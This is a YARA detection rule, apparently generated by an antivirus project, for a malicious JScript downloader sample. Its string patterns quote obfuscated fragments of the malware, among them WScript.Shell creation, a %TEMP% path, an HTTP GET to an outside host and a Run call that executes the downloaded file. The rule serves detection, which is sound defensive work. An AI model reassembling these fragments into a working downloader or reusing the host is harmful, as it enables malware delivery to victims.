rule sig_20160427_1a83fa89d7a18bfb52122c1535daadb0 {
  meta:
    description = "datamaliciousorder - file 20160427_1a83fa89d7a18bfb52122c1535daadb0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8a432f1d99f6b66c546a3862298ee66e7c421cb6ed45ac2960efe4baf05629ac"

  strings:
    $s1  = "function RkmiuVbcpu() {return OlcvrXaoss[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"w4oU6oa" ascii
    $s2  = "function RkmiuVbcpu() {return OlcvrXaoss[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"w4oU6oa" ascii
    $s3  = "function RzrooEvxyu(GnetaHfaju, UffnhDlzzl){UsmnoSfsbo = UsmnoSfsbo * 1; return GnetaHfaju - UffnhDlzzl;};" fullword ascii
    $s4  = "var OlcvrXaoss = function DhcejGajqv() {return KmueyGvvho[RrcsgKbpee](\"WScript\"+\".Shell\");}(), WmgicYgmws = 11;" fullword ascii
    $s5  = "DeyqmCrjag[VnpvbToute](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var KmueyGvvho = this[\"WScript\"];" fullword ascii
    $s7  = "function BwixdPotvm(){return KfuvjAkrhp + \"\";};" fullword ascii
    $s8  = "if (DeyqmCrjag[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function UxchxLvwjs() {return ((MbqcpCxbtm == true) && (MbqcpCxbtm == CmhwaAkivr)) ? 1 : UsmnoSfsbo;};" fullword ascii
    $s10 = "function WgumcSzrsl(){return 23;};" fullword ascii
    $s11 = "CmhwaAkivr = true; " fullword ascii
    $s12 = "return RzrooEvxyu(ShebvVahoy, DvihnSjmwu);" fullword ascii
    $s13 = "VwukePdztu = true;" fullword ascii
    $s14 = "function HjceiXckjr()" fullword ascii
    $s15 = "var CmhwaAkivr = false;" fullword ascii
    $s16 = "function OplzxYomls(SpfaqWbokd){OlcvrXaoss[\"R\"+\"un\"](SpfaqWbokd, UsmnoSfsbo, UsmnoSfsbo);};" fullword ascii
    $s17 = "function VutduWpzmm(){return RrcsgKbpee;};" fullword ascii
    $s18 = "var YgxinCcebo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "MbqcpCxbtm = true; " fullword ascii
    $s20 = "var VwukePdztu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}